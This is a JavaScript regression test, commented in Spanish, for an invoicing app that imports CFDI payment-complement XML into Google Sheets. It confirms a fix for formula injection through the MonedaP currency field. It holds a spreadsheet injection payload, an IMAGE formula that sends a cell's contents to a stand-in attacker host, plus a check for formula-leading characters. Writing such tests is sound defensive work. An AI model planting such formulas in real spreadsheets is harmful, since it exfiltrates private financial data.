// Copia de la revisión 7c (capri-7rev3/revision/) para la rama incremento-7-fix-importar: antes del arreglo esta prueba de concepto
// confirmaba el defecto; ahora comprueba lo corregido (la prueba permanente es tests/revision7-importar.test.js). Uso: bash tests/revision7/correr.sh
// P4 · Regla 7: la moneda de un complemento de pago (MonedaP del XML) llega a Sheets sin textoCelda. validarFacturaCliente sale antes
// de revisar la moneda en tipo P, totalPagosRep la toma tal cual y filaFacturaCliente escribe `moneda: P.moneda` en crudo: un valor que
// empieza con "=" se guarda como FÓRMULA en el libro privado de cobranza (las demás columnas de texto sí pasan por textoCelda/fijo).
// Uso: node revision/p4-formula-monedap.js
'use strict';
const assert = require('assert');
const C = require('./comun');
const A = C.crearArnes();

// Lo que de verdad se manda a setValues/appendRow (el simulacro de Sheets quita el apóstrofo, así que se mira antes)
const escritos = [];
const escribe0 = A.ctx.escribe_;
A.ctx.escribe_ = hoja => {
  const h = escribe0(hoja);
  return Object.assign(Object.create(h), { getRange: (...a) => { const r = h.getRange(...a);
    return Object.assign(Object.create(r), { setValues: v => { escritos.push(...v); return r.setValues(v); } }); } });
};
const formula = '=IMAGE("https://atacante.example/c?d="&ENCODEURL(B2))';
const rep = C.cfdi({ tipo: 'P', uuid: C.U(77), serie: 'P', folio: '9',
  pagos: [{ fecha: '2026-10-20', monto: '1.00', moneda: formula, docs: [{ uuid: C.U(1), ant: '1.00', pagado: '1.00', insoluto: '0.00' }] }] });
const r = A.ok('tania', 'importarFacturasClientes', { archivos: [{ nombre: 'rep.xml', datos: C.b64(rep) }], idSolicitud: C.id('f') });
console.log('Resultado de la importación:', r.resultados[0].estado, '·', r.resultados[0].mensaje);
const enc = A.correr('HOJAS_COBRANZA.FacturasClientes.enc');
const fila = escritos.find(f => f[0] === C.U(77));
assert(!fila && r.resultados[0].estado === 'rechazada' && /CAPRI solo maneja MXN y USD/.test(r.resultados[0].mensaje), 'ARREGLADO: MonedaP solo MXN o USD');
assert(!escritos.some(f => f.some(v => typeof v === 'string' && /^[=+\-@]/.test(v))), 'nada se manda a Sheets como fórmula');
console.log('ARREGLADO: un REP con MonedaP que no es MXN ni USD se rechaza; nada del XML llega a Sheets como fórmula (regla 7).');
